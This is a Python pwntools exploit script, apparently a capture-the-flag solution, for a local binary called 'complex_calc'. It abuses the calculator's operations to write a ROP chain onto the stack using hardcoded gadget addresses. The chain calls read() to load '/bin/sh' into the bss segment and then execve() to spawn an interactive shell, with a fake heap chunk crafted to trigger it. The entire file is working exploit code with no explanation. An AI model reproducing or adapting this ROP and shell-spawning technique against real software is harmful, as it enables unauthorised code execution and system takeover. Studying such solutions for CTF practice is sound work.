#!/usr/bin/env python
from pwn import *

def calc(t, x, y):
    s.sendlineafter('=> ', str(t))
    s.sendlineafter('x: ', str(x))
    s.sendlineafter('y: ', str(y))

def push(val):
    calc(2, (val & 0xffffffff) + 0x28, 0x28)
    calc(2, (val >> 32) + 0x28, 0x28)

if __name__ == '__main__':
    s = process('./complex_calc')
    elf = ELF('./complex_calc')

    s.sendlineafter('calculations: ', str(0xff))

    pop_rdi = 0x401b73
    pop_rsi = 0x401c87
    pop_rdx = 0x437a85
    pop_rax = 0x44db34
    syscall = 0x4648e5

    # pointer to fake chunk
    for i in range(9):
        push(0x6c4a90)

    # read(0, bss, 0x8)
    push(pop_rax)
    push(0)
    push(pop_rdi)
    push(0)
    push(pop_rsi)
    push(elf.bss(0x500))
    push(pop_rdx)
    push(8)
    push(syscall)

    # execve("/bin/sh", NULL, NULL)
    push(pop_rax)
    push(0x3b)
    push(pop_rdi)
    push(elf.bss(0x500))
    push(pop_rsi)
    push(0)
    push(pop_rdx)
    push(0)
    push(syscall)

    # create fake chunk
    calc(1, 0x28, -7)
    calc(3, -0x21, -1)

    s.sendlineafter('=> ', '5')
    s.send('/bin/sh\0')
    s.interactive()
